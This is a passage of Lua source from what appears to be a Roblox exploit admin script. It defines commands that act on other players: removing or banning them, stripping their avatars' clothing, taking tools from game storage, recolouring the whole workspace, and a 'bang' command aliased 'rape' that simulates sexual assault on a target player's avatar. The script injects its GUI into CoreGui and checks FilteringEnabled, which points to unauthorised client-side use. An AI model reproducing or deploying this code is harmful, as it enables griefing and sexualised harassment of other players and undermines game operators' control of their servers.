                size=UDim2.new(0,10,0,1);
                cross_f;
        };
end;
 
for i=0,1 do
        _new'frame'{
                position=UDim2.new(0,11,0,13*i);
                size=UDim2.new(0,1,0,10);
                cross_f;
        };
end;
 
 
 
shot_sound=_new(head:findFirstChild'2920959'or'sound'){
        soundId=url:format(2920959);
        pitch=1.4;
        head;
};
if(shot_sound.Name~='2920959')then
        shot_sound.Name='2920959';
        shot_sound:play();
end;
 
bin=_new'hopperBin'{
        deselected=_cf_deselect;
        selected=_cf_select;
        name=name;
        bag;
};
 
inv=_new'model'{
        name=name;
        char;
};
 
handle=_new'part'{
        size=Vector3.new(0.3,1.3,0.4);
        color=_RGB(140,140,140);
        name='handle';
        formFactor=3;
        inv;
        touched=function(hit)
                if(hit.Parent.className=='Model')then
                        local hum=_hum(hit.Parent);
                        if(hum~=nil)then
                                _hum_dam(hum,handle.Velocity.magnitude);
                        end;
                end;
        end;
};
        h_weld=_new'weld'{
                c1=h_weld_cf_inactive;
                part1=handle;
                part0=torso;
                handle;
        };
                _make_hue();
               
                h_part=_new'part'{
                        size=Vector3.new(0.4,0.4,1.4);
                        color=_RGB(140,140,140);
                        name='handle';
                        formFactor=3;
                        handle;
                };
                hp_weld=_new'weld'{
                        c1=_cframe(0,-1.3/2,-0.3,
                                                20,0,0);
                        part0=handle;
                        part1=h_part;
                        handle;
                };
               
                drag=_new'part'{
                        size=Vector3.new(0.5,0.45,1.5);
                        color=_RGB(100,100,100);
                        name='handle';
                        formFactor=3;
                        handle;
                };
                d_weld=_new'weld'{
                        c1=_cframe(0,-0.25,0);
                        part0=h_part;
                        part1=drag;
                        handle;
                };
               
                tube=_new'part'{
                        size=Vector3.new(0.2,0.2,1.5);
                        color=_RGB(0,0,0);
                        name='handle';
                        formFactor=3;
                        handle;
                };
                t_weld=_new'weld'{
                        c1=_cframe(0,-0.3,-0.1);
                        part0=h_part;
                        part1=tube;
                        handle;
                };
 
bullets_label=_new'textLabel'{
        textStrokeColor3=_RGB(0,0,0);
        textColor3=_RGB(200,200,200);
        textStrokeTransparency=0;
        backgroundTransparency=1;
        fontSize=5;
        screen;
};
 
lightstuff=_new'frame'{
        backgroundColor3=_RGB(255,255,255);
        position=UDim2.new(0,0,0,-1);
        backgroundTransparency=0.5;
        size=UDim2.new(1,0,1,1);
        borderSizePixel=0;
        visible=false;
        screen;
};
 
coroutine.wrap(function()
        local red,white,green;
        repeat
                if(screen.Parent)then
                        if(not green and bullets.current==bullets.maximum)then
                                green=true;
                                bullets_label.TextColor3=_RGB(0,200,0);
                        elseif(not red and bullets.current==0)then
                                red=true;
                                bullets_label.TextColor3=_RGB(200,0,0);
                        elseif((red or green)and bullets.current~=0 and bullets.current~=bullets.maximum)then
                                bullets_label.TextColor3=_RGB(200,200,200);
                                green=false;
                                red=false;
                        end;
                        bullets_label.Text=('Bullets: %d/%d'):format(bullets.current,bullets.clip);
                        bullets_label.Size=UDim2.new(0,bullets_label.TextBounds.X,0,bullets_label.TextBounds.Y);
                        bullets_label.Position=UDim2.new(1,-bullets_label.TextBounds.X-6,1,-bullets_label.TextBounds.Y-6);
                end;
                wait(0.001);
        until nil;
end)();
 
 
_G.dev_pistol_version=(_G.dev_pistol_version or 0)+1;
local vers=_G.dev_pistol_version;
repeat _update();wait(0.001);until _G.dev_pistol_version~=vers or hum.Health==0;
if(hum.Health==0)then
        _clear();
end;
end
end)

addcmd('nil', 'removes the player',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		pcall(function() gPlayers[v].Character:Remove() end)
		gPlayers[v].Character = nil
		if FindTable(SPC, args[1]) then Notify('Made ' ..args[1].. ' nil') else
			Notify('Made player(s) nil') end end end)


addcmd('addban', 'Adds a ban to the banlist if the player is offline.', {},
function(args, speaker)
	local player = args[1]
	local playerid = game:GetService("Players"):GetUserIdFromNameAsync(args[1])
	if player ~= nil then
	if FindTable(WL, player) then Notify('Error: '..player..' is whitelisted') elseif not FindTable(banname, player) then
		table.insert(banT, playerid)
		banname[#banname + 1] = {NAME = tostring(player), ID = tonumber(playerid), AGE = "-"}
		updatebans()
		Notify("Added ban for: "..player)
	end
	end	
end)

addcmd('ban', 'goodbye ;)',{},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
if FindTable(SPC, args[1]) then Notify('Banned ' ..args[1]) else
Notify('Banned player(s)') end
	spawn(function()
if FindTable(WL, gPlayers[v].Name) then Notify('Error: '..gPlayers[v].Name..' is whitelisted') else
if not FindTable(banname, gPlayers[v].Name) then
table.insert(banT, _players[v].userId)
banname[#banname + 1] = {NAME = tostring(gPlayers[v].Name), ID = tonumber(gPlayers[v].userId), AGE = tonumber(gPlayers[v].AccountAge)}
updatebans()
kickF(gPlayers[v])
end
end
end)
end
end)

addcmd('clearbans', 'welcome back!',{'clrbans'},
function(args, speaker)
	banT = {}
	banname = {}
	Notify('Removed all bans')
	updatebans()
end)

addcmd('unban','unbans a player',{},
function(args, speaker)
	if FindTable(banT, gPlayers:GetUserIdFromNameAsync(args[1])) then
		table.remove(banT, GetInTable(banT, gPlayers:GetUserIdFromNameAsync(args[1])))
		for i,v in pairs(banname) do
		if v.NAME == tostring(args[1]) then
		table.remove(banname, i)
		updatebans()
		end end
		Notify('Unbanned ' .. args[1])
	end
end)

addcmd('dismiss', 'dismiss',{'verify'},
function(args, speaker)
for _, child in pairs( workspace:GetChildren()) do
    if child.Name == speaker.Name .. "TAB" then
        child:Destroy() end end
for a,b in pairs(hastab) do if b == speaker.Name then table.remove(hastab, a) end end
end)

addcmd('admin', 'ur an admin now ;o',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		spawn(function()
		if _players[v].userId ~= LP.userId and not isAdmin(_players[v]) then
			table.insert(adminT, _players[v].userId)
			adminname[#adminname + 1] = {NAME = tostring(gPlayers[v].Name)}
			updateadmins()
			if FindTable(SPC, args[1]) then Notify('Gave ' ..args[1].. ' admin') else
Notify('Gave player(s) admin') end
game:GetService('Chat'):Chat(gPlayers[v].Character, 'You are now an admin! The prefix is ' .. cmdprefix, 1)
end end) end end end)

addcmd('unadmin', 'removes the admin',{'noadmin'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local radmin = tostring(_players[v].Name)
		if isAdmin(_players[v]) and _players[v].userId ~= LP.userId then
		table.remove(adminT, GetInTable(adminT, _players[v].userId))
		for a,b in pairs(adminname) do
		if b.NAME == radmin then
		table.remove(adminname, a)
		updateadmins()
		end end
		game:GetService('Chat'):Chat(gPlayers[v].Character, 'You are no longer an admin', 2)
		if FindTable(SPC, args[1]) then Notify('Removed admin from ' .. args[1]) else
		Notify('Removed admin from player(s)') end
	end
	end
	end
end)

addcmd('bang', 'owo',{'rape'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	local target = getPlayer(args[2], speaker)[1]
    for i,v in pairs(players)do
	if args[2] then
		rape(target, v)
	else
		rape(v, speaker.Name)
	end
	end
end)

addcmd('bgui', 'gives player billboard gui presenting text',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
if gPlayers[v].Character.Head:FindFirstChild("BillboardGui") then
gPlayers[v].Character.Head:FindFirstChild("BillboardGui"):Destroy()	
end

y = Instance.new("BillboardGui")
y.Size = UDim2.new(0,100,0,150)
y.StudsOffset = Vector3.new(0,1,0)
y.Parent = gPlayers[v].Character.Head
y.Adornee = gPlayers[v].Character.Head
f = Instance.new("TextLabel")
f.Parent = y
f.BackgroundTransparency = 1
f.Position = UDim2.new(0,0,0,-50)
f.Size = UDim2.new(0,100,0,100)
f.Font = "Highway"
f.FontSize = "Size48"
f.Text = GLS(false, 1)
f.TextStrokeColor3 = Color3.new(0,0,0)
f.TextColor3 = Color3.new(255/255,255/255,255/255)
f.TextStrokeTransparency = 0
f.TextYAlignment = "Bottom"
end
end)

addcmd('unbgui', 'gives player billboard gui presenting text',{'nobgui'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
if gPlayers[v].Character.Head:FindFirstChild("BillboardGui") then
gPlayers[v].Character.Head:FindFirstChild("BillboardGui"):Destroy()	
end
end
end)

function pipeTp(name,target)
	spawn(function()
	local pipe = Instance.new("Part")
	pipe.Name = "Pipe"
	pipe.Color = Color3.new(52/255,142/255,64/255)
	pipe.Size = Vector3.new(8,8,8)
	pipe.Anchored = true
	local mesh = Instance.new("SpecialMesh",pipe)
	mesh.MeshId = "rbxassetid://856736661"
	mesh.Scale = Vector3.new(0.15, 0.15, 0.15)
	local sound = Instance.new("Sound",pipe)
	sound.SoundId = "rbxassetid://864352897"
	sound.Volume = 1
	
	local targetpos = game:GetService("Players")[target].Character.HumanoidRootPart.CFrame
	
	local char = game:GetService("Players")[name].Character
	char.PrimaryPart = char.HumanoidRootPart
	if char:FindFirstChild("Torso") then
		char.Torso.Anchored = true
	else
		char.UpperTorso.Anchored = true
	end
	
	local torso = char.HumanoidRootPart
	local initPos = torso.CFrame
	
	pipe.Parent = workspace
	pipe.CFrame = initPos - Vector3.new(0,8,0)
	
	for i = 0,8,0.2 do
		pipe.CFrame = initPos - Vector3.new(0,8-i,0)
		if i >= 1 then char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,7,0)) end
		game:GetService("RunService").RenderStepped:wait()
	end
	
	sound:Play()
	for i = 7,-8,-0.2 do
		char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,i,0))
		game:GetService("RunService").RenderStepped:wait()
	end
	char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,-8,0))
	
	for i = 8,0,-0.2 do
		pipe.CFrame = initPos - Vector3.new(0,8-i,0)
		game:GetService("RunService").RenderStepped:wait()
	end
	
	pipe.CFrame = targetpos - Vector3.new(0,8,0)
	char:SetPrimaryPartCFrame(pipe.CFrame)
	
	for i = 0,8,0.2 do
		pipe.CFrame = targetpos - Vector3.new(0,8-i,0)
		game:GetService("RunService").RenderStepped:wait()
	end
	
	local played = false
	for i = -8,7,0.2 do
		if i >= 0 and not played then played = true sound:Play() end
		char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,i,0))
		game:GetService("RunService").RenderStepped:wait()
	end
	char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,7,0))
	
	for i = 8,0,-0.2 do
		pipe.CFrame = targetpos - Vector3.new(0,8-i,0)
		if i >= 1 then char:SetPrimaryPartCFrame(pipe.CFrame + Vector3.new(0,7,0)) end
		game:GetService("RunService").RenderStepped:wait()
	end
	
	pipe:Destroy()
	
	if char:FindFirstChild("Torso") then
		char.Torso.Anchored = false
	else
		char.UpperTorso.Anchored = false
	end
	end)
end

addcmd('pipetp', 'uses pipe to tp plr to plr',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	local target = getPlayer(args[2], speaker)[1]
    for i,v in pairs(players)do
        pipeTp(v,target)
    end
end)

addcmd('rhats', 'no more hats',{'removehats'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA('Accessory') then
				v:destroy()
			end
		end
	end
end)

addcmd('naked', 'no more clothing',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Character:GetChildren()) do
			if v:IsA('Shirt') or v:IsA('Pants') or v:IsA('ShirtGraphic') then
				v:destroy()
			end
		end
	end
end)

addcmd('rainbow', 'makes a players parts change colors',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
	local Parts={}
local function GetDiscoColor(hue)
    local section = hue % 1 * 3
    local secondary = 0.5 * math.pi * (section % 1)
    if section < 1 then
        return Vector3.new(1, 1 - math.cos(secondary), 1 - math.sin(secondary))
    elseif section < 2 then
        return Vector3.new(1 - math.sin(secondary), 1, 1 - math.cos(secondary))
    else
        return Vector3.new(1 - math.cos(secondary), 1 - math.sin(secondary), 1)
    end
end
local Part = function(x,y,z,color,tr,cc,an,parent)
    local p = Instance.new('Part',parent)
    p.formFactor = 'Custom'
    p.Size = Vector3.new(x,y,z)
    p.BrickColor = BrickColor.new(color)
    p.CanCollide = cc
    p.Transparency = tr
    p.Anchored = an
    p.TopSurface,p.BottomSurface = 0,0
    p:BreakJoints''
    table.insert(Parts,p)
    return p
end
local Weld = function(p0,p1)
    local w = Instance.new('Motor',p0)
    w.Part0 = p0
    w.Part1 = p1
    return w 
end
local Mesh = function(par,num,x,y,z)
    local msh = 0
    if num == 1 then
        msh = Instance.new("SpecialMesh",par)
        msh.MeshId='rbxasset://fonts/torso.mesh'
        msh.TextureId='rbxasset://25701026'
    end
    if num == 2 then
        msh = Instance.new("SpecialMesh",par)
        msh.MeshId='rbxasset://fonts/head.mesh'
        msh.TextureId='rbxassetid://25701026'
    end
    msh.Scale = Vector3.new(x,y,z)
    return msh
end
local char=gPlayers[v].Character
for _,v in pairs(char:GetChildren()) do
    if v.ClassName=="Part" then
        v.Transparency=1
    elseif v.ClassName=="Hat" then
        v.Handle.Mesh.TextureId='rbxassetid://25701026'
        table.insert(Parts,v.Handle)
    end
end
local t=Part(1,1,1,'',0,false,false,char)
Mesh(t,1,1,1,1)
Weld(char.Torso,t)
local a=Part(1,1,1,'',0,false,false,char)
Mesh(a,1,.5,1,1)
Weld(char['Right Arm'],a)
local a=Part(1,1,1,'',0,false,false,char)
Mesh(a,1,.5,1,1)
Weld(char['Left Arm'],a)
local l=Part(1,1,1,'',0,false,false,char)
Mesh(l,1,.5,1,1)
Weld(char['Right Leg'],l)
local l=Part(1,1,1,'',0,false,false,char)
Mesh(l,1,.5,1,1)
Weld(char['Left Leg'],l)
local h=Part(1,1,1,'',0,false,false,char)
Mesh(h,2,1,1,1)
Weld(char.Head,h)
spawn(function()
    while(coroutine.yield())do
        for i=1,#Parts do
            Parts[i].Mesh.VertexColor=GetDiscoColor(tick()*.5)
        end
    end;
end);
	end
end)

addcmd('notools', 'no more tools',{'rtools','clrtools','removetools'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Backpack:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:destroy() end
	for i,v in pairs(players) do
		for i,v in pairs(gPlayers[v].Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:destroy() end end end
		end
	end
end)

addcmd('keeptools', 'saves tools in starterpack',{'startertools','stools','ktools'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		    local function copy(instance)
        for i,c in pairs(instance:GetChildren())do
            if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = gPlayers[v].StarterGear end
            copy(c)
        end
    end
    copy(gPlayers[v].Backpack)
end
for i,v in pairs(players)do
	local function copy(instance)
        for i,c in pairs(instance:GetChildren())do
            if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = gPlayers[v].StarterGear end
            copy(c)
        end
    end
    copy(gPlayers[v].Character)
end
Notify('Copied tools to StarterGear')
end)

addcmd('nokeeptools', 'deletes tools in starterpack',{'unkeeptools','nokeeptools','nostartertools','unstartertools','nostools','unstools','noktools','unktools'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	for i,c in pairs(gPlayers[v].StarterGear:GetChildren())do
	if c:IsA('Tool') or c:IsA('HopperBin') then c:destroy()
end end end
Notify('Cleared tools from StarterGear')
end)

addcmd('tools', 'steals tools from serverstorage and lighting',{'gears'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		    local function copy(instance)
        for i,c in pairs(instance:GetChildren())do
            if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = gPlayers[v].Backpack end
            copy(c)
        end
    end
    copy(LightingService)
end
for i,v in pairs(players)do
	local function copy(instance)
        for i,c in pairs(instance:GetChildren())do
            if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = gPlayers[v].Backpack end
            copy(c)
        end
    end
    copy(game.ReplicatedStorage)
	end
end)

wdisco = false
addcmd('partdisco', 'color spams the workspace',{'pdisco'},
function(args, speaker)
if wdisco == false then
wdisco = true
presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
		repeat wait(1)
			if wdisco == true then
	    local function color(instance)
        for i,v in pairs(instance:GetChildren())do
            if v.className == "Part" then
				v.BrickColor = BrickColor.new(presets[math.random(1,#presets)]) end
            color(v)
        end
end
color(workspace)
end
until wdisco == false
end
end)

addcmd('unpartdisco', 'stops workspacedisco',{'unpdisco','nopartdisco','nopdisco'},
function(args, speaker)
wdisco = false
end)

addcmd('gravity', 'workspace gravity',{''},
function(args, speaker)
workspace.Gravity = args[1]
Notify('Gravity set to ' .. args[1])
end)

SINFOGUIopen = false
function serverinfogui()
if SINFOGUIopen == false then
local Sinfo = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local shadow = Instance.new("Frame")
local PopupText = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local ContainerFrame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel2 = Instance.new("TextLabel")
local TextLabel3 = Instance.new("TextLabel")
local Time = Instance.new("TextLabel")
local appearance = Instance.new("TextLabel")
local fe = Instance.new("TextLabel")
local maxplayers = Instance.new("TextLabel")
local name = Instance.new("TextLabel")
local placeid = Instance.new("TextLabel")
local playerid = Instance.new("TextLabel")
local players = Instance.new("TextLabel")
Sinfo.Name = "Sinfo"
Sinfo.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = Sinfo
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -150, 0, -400)
drag.Size = UDim2.new(0, 290, 0, 30)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, -10, 0, 0)
PromptDialog.Size = UDim2.new(0, 310, 0, 300)
PromptDialog.ZIndex = 8
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0.0322580636, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 290, 0, 26)
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 8, 0, -3)
PopupText.Size = UDim2.new(1, -16, 0.538461566, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size28
PopupText.Text = "Server"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 267, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 10, 0, 29)
ContainerFrame.Size = UDim2.new(0.935483873, 0, 0.806666672, 0)
ContainerFrame.ZIndex = 5
TextLabel.Name = "Text Label"
TextLabel.Parent = ContainerFrame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.Position = UDim2.new(0, 10, 0, 70)
TextLabel.Size = UDim2.new(0, 100, 0, 20)
TextLabel.ZIndex = 10
TextLabel.Font = Enum.Font.SourceSans
TextLabel.FontSize = Enum.FontSize.Size24
TextLabel.Text = "Run Time:"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextStrokeTransparency = 0
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel2.Name = "Text Label2"
TextLabel2.Parent = ContainerFrame
TextLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel2.BackgroundTransparency = 1
TextLabel2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel2.Position = UDim2.new(0, 10, 0, 120)
TextLabel2.Size = UDim2.new(0, 100, 0, 20)
TextLabel2.ZIndex = 10
TextLabel2.Font = Enum.Font.SourceSans
TextLabel2.FontSize = Enum.FontSize.Size24
TextLabel2.Text = "Statistics:"
TextLabel2.TextColor3 = Color3.new(1, 1, 1)
TextLabel2.TextStrokeTransparency = 0
TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel3.Name = "Text Label3"
TextLabel3.Parent = ContainerFrame
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.Position = UDim2.new(0, 10, 0, 0)
TextLabel3.Size = UDim2.new(0, 100, 0, 20)
TextLabel3.ZIndex = 10
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size24
TextLabel3.Text = "Local Player:"
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextStrokeTransparency = 0
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
Time.Name = "Time"
Time.Parent = ContainerFrame
Time.BackgroundColor3 = Color3.new(0, 0.8, 1)
Time.BackgroundTransparency = 1
Time.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
Time.Position = UDim2.new(0, 10, 0, 90)
Time.Size = UDim2.new(0, 100, 0, 20)
Time.ZIndex = 100
Time.Font = Enum.Font.ArialBold
Time.FontSize = Enum.FontSize.Size14
Time.Text = "Loading..."
Time.TextColor3 = Color3.new(1, 1, 1)
Time.TextStrokeTransparency = 0
Time.TextXAlignment = Enum.TextXAlignment.Left
appearance.Name = "appearance"
appearance.Parent = ContainerFrame
appearance.BackgroundColor3 = Color3.new(0, 0.8, 1)
appearance.BackgroundTransparency = 1
appearance.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
appearance.Position = UDim2.new(0, 10, 0, 40)
appearance.Size = UDim2.new(0, 100, 0, 20)
appearance.ZIndex = 10
appearance.Font = Enum.Font.ArialBold
appearance.FontSize = Enum.FontSize.Size14
appearance.Text = "Appearance: Loading..."
appearance.TextColor3 = Color3.new(1, 1, 1)
appearance.TextStrokeTransparency = 0
appearance.TextXAlignment = Enum.TextXAlignment.Left
fe.Name = "fe"
fe.Parent = ContainerFrame
fe.BackgroundColor3 = Color3.new(0, 0.8, 1)
fe.BackgroundTransparency = 1
fe.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
fe.Position = UDim2.new(0, 10, 0, 200)
fe.Size = UDim2.new(0, 100, 0, 20)
fe.ZIndex = 10
fe.Font = Enum.Font.ArialBold
fe.FontSize = Enum.FontSize.Size14
fe.Text = "Loading..."
fe.TextColor3 = Color3.new(1, 1, 1)
fe.TextStrokeTransparency = 0
fe.TextXAlignment = Enum.TextXAlignment.Left
maxplayers.Name = "maxplayers"
maxplayers.Parent = ContainerFrame
maxplayers.BackgroundColor3 = Color3.new(0, 0.8, 1)
maxplayers.BackgroundTransparency = 1
maxplayers.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
maxplayers.Position = UDim2.new(0, 10, 0, 160)
maxplayers.Size = UDim2.new(0, 100, 0, 20)
maxplayers.ZIndex = 10
maxplayers.Font = Enum.Font.ArialBold
maxplayers.FontSize = Enum.FontSize.Size14
maxplayers.Text = "Loading..."
maxplayers.TextColor3 = Color3.new(1, 1, 1)
maxplayers.TextStrokeTransparency = 0
maxplayers.TextXAlignment = Enum.TextXAlignment.Left
name.Name = "name"
name.Parent = ContainerFrame
name.BackgroundColor3 = Color3.new(0, 0.8, 1)
name.BackgroundTransparency = 1
name.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
name.Position = UDim2.new(0, 10, 0, 180)
name.Size = UDim2.new(0, 100, 0, 20)
name.ZIndex = 10
name.Font = Enum.Font.ArialBold
name.FontSize = Enum.FontSize.Size14
name.Text = "Place: Loading..."
name.TextColor3 = Color3.new(1, 1, 1)
name.TextStrokeTransparency = 0
name.TextXAlignment = Enum.TextXAlignment.Left
placeid.Name = "placeid"
placeid.Parent = ContainerFrame
placeid.BackgroundColor3 = Color3.new(0, 0.8, 1)
placeid.BackgroundTransparency = 1
placeid.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
placeid.Position = UDim2.new(0, 10, 0, 220)
placeid.Size = UDim2.new(0, 100, 0, 20)
placeid.ZIndex = 10
placeid.Font = Enum.Font.ArialBold
placeid.FontSize = Enum.FontSize.Size14
placeid.Text = "Place ID: Loading..."
placeid.TextColor3 = Color3.new(1, 1, 1)
placeid.TextStrokeTransparency = 0
placeid.TextXAlignment = Enum.TextXAlignment.Left
playerid.Name = "playerid"
playerid.Parent = ContainerFrame
playerid.BackgroundColor3 = Color3.new(0, 0.8, 1)
playerid.BackgroundTransparency = 1
playerid.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
playerid.Position = UDim2.new(0, 10, 0, 20)
playerid.Size = UDim2.new(0, 100, 0, 20)
playerid.ZIndex = 10
playerid.Font = Enum.Font.ArialBold
playerid.FontSize = Enum.FontSize.Size14
playerid.Text = "Player ID: Loading..."
playerid.TextColor3 = Color3.new(1, 1, 1)
playerid.TextStrokeTransparency = 0
playerid.TextXAlignment = Enum.TextXAlignment.Left
players.Name = "players"
players.Parent = ContainerFrame
players.BackgroundColor3 = Color3.new(0, 0.8, 1)
players.BackgroundTransparency = 1
players.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
players.Position = UDim2.new(0, 10, 0, 140)
players.Size = UDim2.new(0, 100, 0, 20)
players.ZIndex = 100
players.Font = Enum.Font.ArialBold
players.FontSize = Enum.FontSize.Size14
players.Text = "Loading..."
players.TextColor3 = Color3.new(1, 1, 1)
players.TextStrokeTransparency = 0
players.TextXAlignment = Enum.TextXAlignment.Left
local SINFOGUI = ContainerFrame
drag:TweenPosition(UDim2.new(0.5, -150, 0, 100), "InOut", "Quart", 0.5, true, nil) 
SINFOGUIopen = true wait(0.5)
local Asset = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
SINFOGUI.name.Text = "Place: " .. Asset.Name
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -150, 0, -400), "InOut", "Quart", 0.5, true, nil) 
wait(0.6) SINFOGUIopen = false Sinfo:Destroy() end)
SINFOGUI.playerid.Text = "Player ID: " ..gPlayers.LocalPlayer.UserId
if workspace.FilteringEnabled == true then
SINFOGUI.fe.Text = "Filtering Enabled"
elseif workspace.FilteringEnabled == false then
SINFOGUI.fe.Text = "Filtering Disabled"  end
SINFOGUI.maxplayers.Text = gPlayers.MaxPlayers.. " Players Max"
SINFOGUI.placeid.Text = "Place ID: " ..game.PlaceId repeat
	players = gPlayers:getPlayers()
	SINFOGUI.players.Text = #players.. " Player(s)"
	SINFOGUI.appearance.Text = "Appearance: " ..gPlayers.LocalPlayer.CharacterAppearanceId
	local seconds = math.floor(workspace.DistributedGameTime)
	local minutes = math.floor(workspace.DistributedGameTime / 60)
	local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
	local seconds = seconds - (minutes * 60)
	local minutes = minutes - (hours * 60)
	if hours < 1 then if minutes < 1 then
	SINFOGUI.Time.Text = seconds .. " Second(s)" else
	SINFOGUI.Time.Text = minutes .. " Minute(s), " .. seconds .. " Second(s)" end else
	SINFOGUI.Time.Text = hours .. " Hour(s), " .. minutes .. " Minute(s), " .. seconds .. " Second(s)"
end  wait(1) until SINFOGUIopen == false end end
addcmd('serverinfo', 'gives you info about the server',{'info','sinfo'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
serverinfogui()
end
end)

addcmd('sparkles', 'give a player sparkles',{'sp'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
	spawn(function()
        local pchar=_char(v)
        local Sparkles1 = Instance.new("Sparkles", pchar.Head)
        local Sparkles2 = Instance.new("Sparkles", pchar.HumanoidRootPart)
        local Sparkles3 = Instance.new("Sparkles", pchar["Left Arm"])
        local Sparkles4 = Instance.new("Sparkles", pchar["Right Arm"])
        local Sparkles5 = Instance.new("Sparkles", pchar["Left Leg"])
        local Sparkles6 = Instance.new("Sparkles", pchar["Right Leg"])
    	if not args[2] then return end
        Sparkles1.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Sparkles2.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Sparkles3.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Sparkles4.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
        Sparkles5.Color = Color3.fromRGB((args[2]),(args[3]),(args[4]))
